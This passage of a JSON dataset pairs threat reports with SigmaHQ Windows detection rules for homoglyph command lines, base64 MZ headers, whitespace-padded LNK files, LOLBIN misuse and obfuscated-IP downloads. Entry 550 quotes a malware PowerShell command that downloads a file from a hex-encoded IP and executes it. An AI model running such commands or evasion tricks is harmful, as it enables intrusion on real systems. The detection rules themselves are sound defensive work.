        "https://redcanary.com/threat-detection-report/threats/socgholish/#threat-socgholish",
        "http://www.irongeek.com/homoglyph-attack-generator.php"
      ],
      "author": "Micah Babinski, @micahbabinski",
      "date": "2023-05-07",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_upper": {
          "CommandLine|contains": [
            "А",
            "В",
            "Е",
            "К",
            "М",
            "Н",
            "О",
            "Р",
            "С",
            "Т",
            "Х",
            "Ѕ",
            "І",
            "Ј",
            "Ү",
            "Ӏ",
            "Ԍ",
            "Ԛ",
            "Ԝ",
            "Α",
            "Β",
            "Ε",
            "Ζ",
            "Η",
            "Ι",
            "Κ",
            "Μ",
            "Ν",
            "Ο",
            "Ρ",
            "Τ",
            "Υ",
            "Χ"
          ]
        },
        "selection_lower": {
          "CommandLine|contains": [
            "а",
            "е",
            "о",
            "р",
            "с",
            "х",
            "ѕ",
            "і",
            "ӏ",
            "ј",
            "һ",
            "ԁ",
            "ԛ",
            "ԝ",
            "ο"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Commandlines with legitimate Cyrillic text; will likely require tuning (or not be usable) in countries where these alphabets are in use."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_homoglyph_cyrillic_lookalikes.yml"
  },
  "541": {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer **Categories:** coinminer, exploit **Published Date:** July 11, 2022 --- In March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting. US CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link). --- ## Summary Over the",
    "sigma_rule": {
      "title": "Base64 MZ Header In CommandLine",
      "id": "22e58743-4ac8-4a9f-bf19-00a0428d8c5f",
      "status": "test",
      "description": "Detects encoded base64 MZ header in the commandline",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "TVqQAAMAAAAEAAAA",
            "TVpQAAIAAAAEAA8A",
            "TVqAAAEAAAAEABAA",
            "TVoAAAAAAAAAAAAA",
            "TVpTAQEAAAAEAAAA"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_inline_base64_mz_header.yml"
  },
  "542": {
    "url": "https://syedhasan010.medium.com/forensics-analysis-of-an-lnk-file-da68a98b8415",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious LNK Command-Line Padding with Whitespace Characters",
      "id": "dd8756e7-a3a0-4768-b47e-8f545d1a751c",
      "status": "experimental",
      "description": "Detects exploitation of LNK file command-line length discrepancy, where attackers hide malicious commands beyond the 260-character UI limit while the actual command-line argument field supports 4096 characters using whitespace padding (e.g., 0x20, 0x09-0x0D).\nAdversaries insert non-printable whitespace characters (e.g., Line Feed \\x0A, Carriage Return \\x0D) to pad the visible section of the LNK file, pushing malicious commands past the UI-visible boundary.\nThe hidden payload, executed at runtime but invisible in Windows Explorer properties, enables stealthy execution and evasion—commonly used for social engineering attacks.\nThis rule flags suspicious use of such padding observed in real-world attacks.\n",
      "references": [
        "https://syedhasan010.medium.com/forensics-analysis-of-an-lnk-file-da68a98b8415",
        "https://thehackernews.com/2025/03/unpatched-windows-zero-day-flaw.html",
        "https://www.trendmicro.com/en_us/research/25/c/windows-shortcut-zero-day-exploit.html"
      ],
      "author": "Swachchhanda Shrawan Poudel (Nextron Systems)",
      "date": "2025-03-19",
      "tags": [
        "attack.initial-access",
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "ParentImage|endswith": "\\explorer.exe"
          },
          {
            "ParentCommandLine|contains": ".lnk"
          }
        ],
        "selection_cmd": [
          {
            "CommandLine|contains": [
              "                 ",
              "\\u0009",
              "\\u000A",
              "\\u0011",
              "\\u0012",
              "\\u0013",
              "\\u000B",
              "\\u000C",
              "\\u000D"
            ]
          },
          {
            "CommandLine|re": "\\n\\n\\n\\n\\n\\n"
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_lnk_exec_hidden_cmd.yml"
  },
  "543": {
    "url": "https://thehackernews.com/2025/03/unpatched-windows-zero-day-flaw.html",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious LNK Command-Line Padding with Whitespace Characters",
      "id": "dd8756e7-a3a0-4768-b47e-8f545d1a751c",
      "status": "experimental",
      "description": "Detects exploitation of LNK file command-line length discrepancy, where attackers hide malicious commands beyond the 260-character UI limit while the actual command-line argument field supports 4096 characters using whitespace padding (e.g., 0x20, 0x09-0x0D).\nAdversaries insert non-printable whitespace characters (e.g., Line Feed \\x0A, Carriage Return \\x0D) to pad the visible section of the LNK file, pushing malicious commands past the UI-visible boundary.\nThe hidden payload, executed at runtime but invisible in Windows Explorer properties, enables stealthy execution and evasion—commonly used for social engineering attacks.\nThis rule flags suspicious use of such padding observed in real-world attacks.\n",
      "references": [
        "https://syedhasan010.medium.com/forensics-analysis-of-an-lnk-file-da68a98b8415",
        "https://thehackernews.com/2025/03/unpatched-windows-zero-day-flaw.html",
        "https://www.trendmicro.com/en_us/research/25/c/windows-shortcut-zero-day-exploit.html"
      ],
      "author": "Swachchhanda Shrawan Poudel (Nextron Systems)",
      "date": "2025-03-19",
      "tags": [
        "attack.initial-access",
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "ParentImage|endswith": "\\explorer.exe"
          },
          {
            "ParentCommandLine|contains": ".lnk"
          }
        ],
        "selection_cmd": [
          {
            "CommandLine|contains": [
              "                 ",
              "\\u0009",
              "\\u000A",
              "\\u0011",
              "\\u0012",
              "\\u0013",
              "\\u000B",
              "\\u000C",
              "\\u000D"
            ]
          },
          {
            "CommandLine|re": "\\n\\n\\n\\n\\n\\n"
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_lnk_exec_hidden_cmd.yml"
  },
  "544": {
    "url": "https://www.trendmicro.com/en_us/research/25/c/windows-shortcut-zero-day-exploit.html",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious LNK Command-Line Padding with Whitespace Characters",
      "id": "dd8756e7-a3a0-4768-b47e-8f545d1a751c",
      "status": "experimental",
      "description": "Detects exploitation of LNK file command-line length discrepancy, where attackers hide malicious commands beyond the 260-character UI limit while the actual command-line argument field supports 4096 characters using whitespace padding (e.g., 0x20, 0x09-0x0D).\nAdversaries insert non-printable whitespace characters (e.g., Line Feed \\x0A, Carriage Return \\x0D) to pad the visible section of the LNK file, pushing malicious commands past the UI-visible boundary.\nThe hidden payload, executed at runtime but invisible in Windows Explorer properties, enables stealthy execution and evasion—commonly used for social engineering attacks.\nThis rule flags suspicious use of such padding observed in real-world attacks.\n",
      "references": [
        "https://syedhasan010.medium.com/forensics-analysis-of-an-lnk-file-da68a98b8415",
        "https://thehackernews.com/2025/03/unpatched-windows-zero-day-flaw.html",
        "https://www.trendmicro.com/en_us/research/25/c/windows-shortcut-zero-day-exploit.html"
      ],
      "author": "Swachchhanda Shrawan Poudel (Nextron Systems)",
      "date": "2025-03-19",
      "tags": [
        "attack.initial-access",
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "ParentImage|endswith": "\\explorer.exe"
          },
          {
            "ParentCommandLine|contains": ".lnk"
          }
        ],
        "selection_cmd": [
          {
            "CommandLine|contains": [
              "                 ",
              "\\u0009",
              "\\u000A",
              "\\u0011",
              "\\u0012",
              "\\u0013",
              "\\u000B",
              "\\u000C",
              "\\u000D"
            ]
          },
          {
            "CommandLine|re": "\\n\\n\\n\\n\\n\\n"
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_lnk_exec_hidden_cmd.yml"
  },
  "545": {
    "url": "https://thedfirreport.com/2021/12/13/diavol-ransomware/",
    "markdown": "# Diavol Ransomware In the past, threat actors have used BazarLoader to deploy Ryuk and Conti ransomware, as reported on many occasions. In this intrusion, however, a BazarLoader infection resulted in deployment of Diavol Ransomware. First discovered in June 2021, by FortiGuard Labs, Diavol Ransomware has been suspected to be linked to the Wizard Spider threat actor. In this report, we observed threat actors deploy multiple Cobalt Strike DLL beacons, perform internal discovery using Windows utilities, execute lateral movement using AnyDesk and RDP, dump credentials multiple ways, exfiltrate data and deploy domain wide ransomware in as little as 32 hours",
    "sigma_rule": {
      "title": "LOLBIN Execution From Abnormal Drive",
      "id": "d4ca7c59-e9e4-42d8-bf57-91a776efcb87",
      "related": [
        {
          "id": "5b80cf53-3a46-4adc-960b-05ec19348d74",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects LOLBINs executing from an abnormal or uncommon drive such as a mounted ISO.",
      "references": [
        "https://thedfirreport.com/2021/12/13/diavol-ransomware/",
        "https://www.scythe.io/library/threat-emulation-qakbot",
        "https://sec-consult.com/blog/detail/bumblebee-hunting-with-a-velociraptor/"
      ],
      "author": "Christopher Peacock '@securepeacock', SCYTHE '@scythe_io', Angelo Violetti - SEC Consult '@angelo_violetti', Aaron Herman",
      "date": "2022-01-25",
      "modified": "2023-08-29",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\calc.exe",
              "\\certutil.exe",
              "\\cmstp.exe",
              "\\cscript.exe",
              "\\installutil.exe",
              "\\mshta.exe",
              "\\regsvr32.exe",
              "\\rundll32.exe",
              "\\wscript.exe"
            ]
          },
          {
            "OriginalFileName": [
              "CALC.EXE",
              "CertUtil.exe",
              "CMSTP.EXE",
              "cscript.exe",
              "installutil.exe",
              "MSHTA.EXE",
              "REGSVR32.EXE",
              "RUNDLL32.EXE",
              "wscript.exe"
            ]
          }
        ],
        "filter_main_currentdirectory": {
          "CurrentDirectory|contains": "C:\\"
        },
        "filter_main_empty": {
          "CurrentDirectory": ""
        },
        "filter_main_null": {
          "CurrentDirectory": null
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Rare false positives could occur on servers with multiple drives."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_lolbin_exec_from_non_c_drive.yml"
  },
  "546": {
    "url": "https://www.scythe.io/library/threat-emulation-qakbot",
    "markdown": "# Threat Emulation: Qakbot **Intro** Welcome to the July 2022 SCYTHE #ThreatThursday! This edition features an emulation of Qakbot, a piece of malware that is no stranger to the threat intel community. Qakbot, first seen in 2007, is making headlines again due to use by threat actors like Black Basta as a means of initial entry, lateral movement, and persistence. Published: 28 Jul 2022 ## Intro Welcome to the July 2022 SCYTHE #ThreatThursday! This edition features an emulation of Qakbot, a piece of malware that is no stranger to the threat intel community. Qakbot, first seen in 2007, is making",
    "sigma_rule": {
      "title": "LOLBIN Execution From Abnormal Drive",
      "id": "d4ca7c59-e9e4-42d8-bf57-91a776efcb87",
      "related": [
        {
          "id": "5b80cf53-3a46-4adc-960b-05ec19348d74",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects LOLBINs executing from an abnormal or uncommon drive such as a mounted ISO.",
      "references": [
        "https://thedfirreport.com/2021/12/13/diavol-ransomware/",
        "https://www.scythe.io/library/threat-emulation-qakbot",
        "https://sec-consult.com/blog/detail/bumblebee-hunting-with-a-velociraptor/"
      ],
      "author": "Christopher Peacock '@securepeacock', SCYTHE '@scythe_io', Angelo Violetti - SEC Consult '@angelo_violetti', Aaron Herman",
      "date": "2022-01-25",
      "modified": "2023-08-29",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\calc.exe",
              "\\certutil.exe",
              "\\cmstp.exe",
              "\\cscript.exe",
              "\\installutil.exe",
              "\\mshta.exe",
              "\\regsvr32.exe",
              "\\rundll32.exe",
              "\\wscript.exe"
            ]
          },
          {
            "OriginalFileName": [
              "CALC.EXE",
              "CertUtil.exe",
              "CMSTP.EXE",
              "cscript.exe",
              "installutil.exe",
              "MSHTA.EXE",
              "REGSVR32.EXE",
              "RUNDLL32.EXE",
              "wscript.exe"
            ]
          }
        ],
        "filter_main_currentdirectory": {
          "CurrentDirectory|contains": "C:\\"
        },
        "filter_main_empty": {
          "CurrentDirectory": ""
        },
        "filter_main_null": {
          "CurrentDirectory": null
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Rare false positives could occur on servers with multiple drives."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_lolbin_exec_from_non_c_drive.yml"
  },
  "547": {
    "url": "https://sec-consult.com/blog/detail/bumblebee-hunting-with-a-velociraptor/",
    "markdown": "# BumbleBee hunting with a Velociraptor **11.04.2023** **Category:** research BumbleBee, a malware which is mainly abused by threat actors in data exfiltration and ransomware incidents, was recently analyzed by Angelo Violetti of SEC Defence - the SEC Consult Digital Forensics and Incident Response team. During his research, he used several tools and techniques to define ways to detect the presence of BumbleBee on a compromised infrastructure. The various detection opportunities described in the report can be useful for organizations to detect an infection in its first stages and, therefore, prevent further malicious activity starting from BumbleBee. The detection opportunities rely",
    "sigma_rule": {
      "title": "LOLBIN Execution From Abnormal Drive",
      "id": "d4ca7c59-e9e4-42d8-bf57-91a776efcb87",
      "related": [
        {
          "id": "5b80cf53-3a46-4adc-960b-05ec19348d74",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects LOLBINs executing from an abnormal or uncommon drive such as a mounted ISO.",
      "references": [
        "https://thedfirreport.com/2021/12/13/diavol-ransomware/",
        "https://www.scythe.io/library/threat-emulation-qakbot",
        "https://sec-consult.com/blog/detail/bumblebee-hunting-with-a-velociraptor/"
      ],
      "author": "Christopher Peacock '@securepeacock', SCYTHE '@scythe_io', Angelo Violetti - SEC Consult '@angelo_violetti', Aaron Herman",
      "date": "2022-01-25",
      "modified": "2023-08-29",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\calc.exe",
              "\\certutil.exe",
              "\\cmstp.exe",
              "\\cscript.exe",
              "\\installutil.exe",
              "\\mshta.exe",
              "\\regsvr32.exe",
              "\\rundll32.exe",
              "\\wscript.exe"
            ]
          },
          {
            "OriginalFileName": [
              "CALC.EXE",
              "CertUtil.exe",
              "CMSTP.EXE",
              "cscript.exe",
              "installutil.exe",
              "MSHTA.EXE",
              "REGSVR32.EXE",
              "RUNDLL32.EXE",
              "wscript.exe"
            ]
          }
        ],
        "filter_main_currentdirectory": {
          "CurrentDirectory|contains": "C:\\"
        },
        "filter_main_empty": {
          "CurrentDirectory": ""
        },
        "filter_main_null": {
          "CurrentDirectory": null
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Rare false positives could occur on servers with multiple drives."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_lolbin_exec_from_non_c_drive.yml"
  },
  "548": {
    "url": "https://h.43z.one/ipconverter/",
    "markdown": "# IP Converter ## Convert 81.4.124.10: - http://81.4.124.10 - http://81.4.31754 - http://81.293898 - http://1359248394 - http://0x51.0x4.0x7c.0xa - http://0x51047c0a - http://0x51.0x047c0a - http://0x51.0x4.00x7c0a - http://0121.04.0174.012 - http://000000121.004.0000000174.0000000012 - http://012101076012 - http://%38%31%2e%34%2e%31%32%34%2e%31%30 - http://81.0x4.0000000174.0xa - http://⑧①ï¼Ž④ï¼Ž①②④ï¼Ž①⓪ï¼",
    "sigma_rule": {
      "title": "Obfuscated IP Download Activity",
      "id": "cb5a2333-56cf-4562-8fcb-22ba1bca728d",
      "status": "test",
      "description": "Detects use of an encoded/obfuscated version of an IP address (hex, octal...) in an URL combined with a download command",
      "references": [
        "https://h.43z.one/ipconverter/",
        "https://web.archive.org/web/20220801074831/https://twitter.com/Yasser_Elsnbary/status/1553804135354564608",
        "https://twitter.com/fr0s7_/status/1712780207105404948"
      ],
      "author": "Florian Roth (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2022-08-03",
      "modified": "2023-11-06",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_command": {
          "CommandLine|contains": [
            "Invoke-WebRequest",
            "iwr ",
            "wget ",
            "curl ",
            "DownloadFile",
            "DownloadString"
          ]
        },
        "selection_ip_1": {
          "CommandLine|contains": [
            " 0x",
            "//0x",
            ".0x",
            ".00x"
          ]
        },
        "selection_ip_2": {
          "CommandLine|contains|all": [
            "http://%",
            "%2e"
          ]
        },
        "selection_ip_3": [
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.[0-9]{1,3}\\.0[0-9]{3,4}"
          },
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.0[0-9]{3,7}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{3,11}"
          },
          {
            "CommandLine|re": "https?://(0[0-9]{1,11}\\.){3}0[0-9]{1,11}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{1,11}"
          },
          {
            "CommandLine|re": " [0-7]{7,13}"
          }
        ],
        "filter_main_valid_ip": {
          "CommandLine|re": "https?://((25[0-5]|(2[0-4]|1\\d|[1-9])?\\d)(\\.|\\b)){4}"
        },
        "condition": "selection_command and 1 of selection_ip_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_obfuscated_ip_download.yml"
  },
  "549": {
    "url": "https://web.archive.org/web/20220801074831/https://twitter.com/Yasser_Elsnbary/status/1553804135354564608",
    "markdown": "# Post Jul 31, 2022 Use this site to convert your IP while testing on #ssrf https://h.43z.one/ipconverter/ #SSRF ```image Description: The image displays a web interface for an IP address conversion tool, specifically showcasing the loopback IP address '127.0.0.1'. The interface includes a text input field where the IP address can be entered along with a 'convert' button. Below the input field, a list of various representations of the IP address is shown, including hexadecimal and decimal formats. The bottom of the image indicates that the tool is created by a user identified as 'h43z'. Transcription: | 127.0.0.1 convert http://127.0.0.1",
    "sigma_rule": {
      "title": "Obfuscated IP Download Activity",
      "id": "cb5a2333-56cf-4562-8fcb-22ba1bca728d",
      "status": "test",
      "description": "Detects use of an encoded/obfuscated version of an IP address (hex, octal...) in an URL combined with a download command",
      "references": [
        "https://h.43z.one/ipconverter/",
        "https://web.archive.org/web/20220801074831/https://twitter.com/Yasser_Elsnbary/status/1553804135354564608",
        "https://twitter.com/fr0s7_/status/1712780207105404948"
      ],
      "author": "Florian Roth (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2022-08-03",
      "modified": "2023-11-06",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_command": {
          "CommandLine|contains": [
            "Invoke-WebRequest",
            "iwr ",
            "wget ",
            "curl ",
            "DownloadFile",
            "DownloadString"
          ]
        },
        "selection_ip_1": {
          "CommandLine|contains": [
            " 0x",
            "//0x",
            ".0x",
            ".00x"
          ]
        },
        "selection_ip_2": {
          "CommandLine|contains|all": [
            "http://%",
            "%2e"
          ]
        },
        "selection_ip_3": [
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.[0-9]{1,3}\\.0[0-9]{3,4}"
          },
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.0[0-9]{3,7}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{3,11}"
          },
          {
            "CommandLine|re": "https?://(0[0-9]{1,11}\\.){3}0[0-9]{1,11}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{1,11}"
          },
          {
            "CommandLine|re": " [0-7]{7,13}"
          }
        ],
        "filter_main_valid_ip": {
          "CommandLine|re": "https?://((25[0-5]|(2[0-4]|1\\d|[1-9])?\\d)(\\.|\\b)){4}"
        },
        "condition": "selection_command and 1 of selection_ip_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_obfuscated_ip_download.yml"
  },
  "550": {
    "url": "https://twitter.com/fr0s7_/status/1712780207105404948",
    "markdown": "# Post Oct 13, 2023 Nice try #Redline trying to Obfuscate IP's into hex ```image Description: The image displays a command line interface output, showcasing a series of Windows command line instructions. The highlighted section in red reveals a URL formatted in hexadecimal, which is likely part of a script or command that downloads content from the specified address. The context implies a discussion about the obfuscation techniques used by a malware variant named Redline, particularly in how it conceals IP addresses. Transcription: | C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0 mkdir C:\\a;(iwr 'http://0x59176032:7777/c.txt' -OutFile 'C:\\a\\c.txt').Content;$c=gc \"C:\\a\\c.txt\";gc C:\\a\\c.txt | % {iex $_} C:\\Program Files",
    "sigma_rule": {
      "title": "Obfuscated IP Download Activity",
      "id": "cb5a2333-56cf-4562-8fcb-22ba1bca728d",
      "status": "test",
      "description": "Detects use of an encoded/obfuscated version of an IP address (hex, octal...) in an URL combined with a download command",
      "references": [
        "https://h.43z.one/ipconverter/",
        "https://web.archive.org/web/20220801074831/https://twitter.com/Yasser_Elsnbary/status/1553804135354564608",
        "https://twitter.com/fr0s7_/status/1712780207105404948"
      ],
      "author": "Florian Roth (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2022-08-03",
      "modified": "2023-11-06",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_command": {
          "CommandLine|contains": [
            "Invoke-WebRequest",
            "iwr ",
            "wget ",
            "curl ",
            "DownloadFile",
            "DownloadString"
          ]
        },
        "selection_ip_1": {
          "CommandLine|contains": [
            " 0x",
            "//0x",
            ".0x",
            ".00x"
          ]
        },
        "selection_ip_2": {
          "CommandLine|contains|all": [
            "http://%",
            "%2e"
          ]
        },
        "selection_ip_3": [
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.[0-9]{1,3}\\.0[0-9]{3,4}"
          },
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.0[0-9]{3,7}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{3,11}"
          },
          {
            "CommandLine|re": "https?://(0[0-9]{1,11}\\.){3}0[0-9]{1,11}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{1,11}"
          },
          {
            "CommandLine|re": " [0-7]{7,13}"
          }
        ],
        "filter_main_valid_ip": {
          "CommandLine|re": "https?://((25[0-5]|(2[0-4]|1\\d|[1-9])?\\d)(\\.|\\b)){4}"
        },
        "condition": "selection_command and 1 of selection_ip_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_obfuscated_ip_download.yml"
  },
  "551": {
    "url": "https://h.43z.one/ipconverter/",
    "markdown": "# IP Converter ## Convert 81.4.124.10: - http://81.4.124.10 - http://81.4.31754 - http://81.293898 - http://1359248394 - http://0x51.0x4.0x7c.0xa - http://0x51047c0a - http://0x51.0x047c0a - http://0x51.0x4.00x7c0a - http://0121.04.0174.012 - http://000000121.004.0000000174.0000000012 - http://012101076012 - http://%38%31%2e%34%2e%31%32%34%2e%31%30 - http://81.0x4.0000000174.0xa - http://⑧①ï¼Ž④ï¼Ž①②④ï¼Ž①⓪ï¼",
    "sigma_rule": {
      "title": "Obfuscated IP Via CLI",
      "id": "56d19cb4-6414-4769-9644-1ed35ffbb148",
      "status": "test",
      "description": "Detects usage of an encoded/obfuscated version of an IP address (hex, octal, etc.) via command line",
      "references": [
        "https://h.43z.one/ipconverter/",
        "https://web.archive.org/web/20220801074831/https://twitter.com/Yasser_Elsnbary/status/1553804135354564608"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2022-08-03",
      "modified": "2023-11-06",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": [
            "\\ping.exe",
            "\\arp.exe"
          ]
        },
        "selection_ip_1": {
          "CommandLine|contains": [
            " 0x",
            "//0x",
            ".0x",
            ".00x"
          ]
        },
        "selection_ip_2": {
          "CommandLine|contains|all": [
            "http://%",
            "%2e"
          ]
        },
        "selection_ip_3": [
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.[0-9]{1,3}\\.0[0-9]{3,4}"
          },
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.0[0-9]{3,7}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{3,11}"
          },
          {
            "CommandLine|re": "https?://(0[0-9]{1,11}\\.){3}0[0-9]{1,11}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{1,11}"
          },
          {
            "CommandLine|re": " [0-7]{7,13}"
          }
        ],
        "filter_main_valid_ip": {
          "CommandLine|re": "https?://((25[0-5]|(2[0-4]|1\\d|[1-9])?\\d)(\\.|\\b)){4}"
        },
        "condition": "selection_img and 1 of selection_ip_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_obfuscated_ip_via_cli.yml"
  },
  "552": {
    "url": "https://web.archive.org/web/20220801074831/https://twitter.com/Yasser_Elsnbary/status/1553804135354564608",
    "markdown": "# Post Jul 31, 2022 Use this site to convert your IP while testing on #ssrf https://h.43z.one/ipconverter/ #SSRF ```image Description: The image displays a web interface for an IP address conversion tool, specifically showcasing the loopback IP address '127.0.0.1'. The interface includes a text input field where the IP address can be entered along with a 'convert' button. Below the input field, a list of various representations of the IP address is shown, including hexadecimal and decimal formats. The bottom of the image indicates that the tool is created by a user identified as 'h43z'. Transcription: | 127.0.0.1 convert http://127.0.0.1",
    "sigma_rule": {
      "title": "Obfuscated IP Via CLI",
      "id": "56d19cb4-6414-4769-9644-1ed35ffbb148",
      "status": "test",
      "description": "Detects usage of an encoded/obfuscated version of an IP address (hex, octal, etc.) via command line",
      "references": [
        "https://h.43z.one/ipconverter/",
        "https://web.archive.org/web/20220801074831/https://twitter.com/Yasser_Elsnbary/status/1553804135354564608"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2022-08-03",
      "modified": "2023-11-06",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": [
            "\\ping.exe",
            "\\arp.exe"
          ]
        },
        "selection_ip_1": {
          "CommandLine|contains": [
            " 0x",
            "//0x",
            ".0x",
            ".00x"
          ]
        },
        "selection_ip_2": {
          "CommandLine|contains|all": [
            "http://%",
            "%2e"
          ]
        },
        "selection_ip_3": [
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.[0-9]{1,3}\\.0[0-9]{3,4}"
          },
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.0[0-9]{3,7}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{3,11}"
          },
          {
            "CommandLine|re": "https?://(0[0-9]{1,11}\\.){3}0[0-9]{1,11}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{1,11}"
          },
          {
            "CommandLine|re": " [0-7]{7,13}"
          }
        ],
        "filter_main_valid_ip": {
          "CommandLine|re": "https?://((25[0-5]|(2[0-4]|1\\d|[1-9])?\\d)(\\.|\\b)){4}"
        },
        "condition": "selection_img and 1 of selection_ip_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_obfuscated_ip_via_cli.yml"
  },
  "553": {
    "url": "https://web.archive.org/web/20220731153253/https://twitter.com/x86matthew/status/1505476263464607744",
